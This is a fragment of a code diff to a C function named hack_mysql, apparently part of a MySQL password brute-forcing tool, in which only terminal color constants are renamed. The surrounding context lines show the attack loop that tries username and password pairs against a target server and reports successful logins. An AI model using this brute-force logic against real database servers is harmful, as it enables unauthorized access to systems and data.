@@ -28,12 +28,12 @@ int hack_mysql(in_addr_t ip, int port){
 				show_error("", errno);
 				return RETURN_ERROR;
 			}
-			printf("\r%sPercentage completed: %s%.4lf%% (%s/%s)               ",C_WHITE,C_GREEN, (double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
+			printf("\r%sPercentage completed: %s%.4lf%% (%s/%s)               ",WHITE,HGREEN, (double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
 			fflush(stdout);
 			usleep(BRUTE_FORCE_DELAY);
 			if(mysql_real_connect(conn, inet_ntoa(*((struct in_addr*)&dest_ip.s_addr)), usernames[i], passwords[j], "sys", port, NULL, 0) != NULL){
 				show_error("", errno);
-				printf("%s",C_RED);
+				printf("%s",HRED);
 				printf("\n\nLoging successfull with user: %s, password: %s.\n\n",usernames[i], passwords[j]);
 				mysql_close(conn);
 				conn=NULL;
@@ -42,6 +42,6 @@ int hack_mysql(in_addr_t ip, int port){
 		}
 	}
 	mysql_close(conn);
-	printf("%s",C_DEFAULT);
+	printf("%s",DEFAULT);
 	return contUsersFound;
 }
